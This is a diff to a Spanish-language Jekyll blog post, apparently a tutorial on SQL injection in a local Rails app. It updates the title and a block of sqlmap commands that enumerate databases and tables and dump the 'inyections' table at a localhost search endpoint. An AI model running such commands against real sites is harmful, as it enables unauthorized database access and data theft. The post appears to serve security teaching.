@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "SQL Inyection On Rails"
+title:  "Rails 5 SQL Inyection On Rails"
 date:   2016-04-26 00:37:19 -0300
 categories: jekyll update
 ---
@@ -41,8 +41,8 @@ Explotamos vulnerabilidad
 
 ```
 sqlmap -u "http://localhost:3000/search/*" --dbms="SQLite" --risk=3 --level=5 --dbs
-sqlmap -u "http://localhost:3000/search/*" --dbms="SQLite" --risk=3 --level=5 --dbs
-sqlmap -u "http://localhost:3000/search/*" --dbms="SQLite" --risk=3 --level=5 --tables
+sqlmap -u "http://localhost:3000/search/*" --dbms="SQLite" --risk=3 --level=5 --dbs -D database --table
+sqlmap -u "http://localhost:3000/search/*" --dbms="SQLite" --risk=3 --level=5 --tables 
 sqlmap -u "http://localhost:3000/search/*" --dbms="SQLite" --risk=3 --level=5 -T inyections --dump -v 3
 ```
 
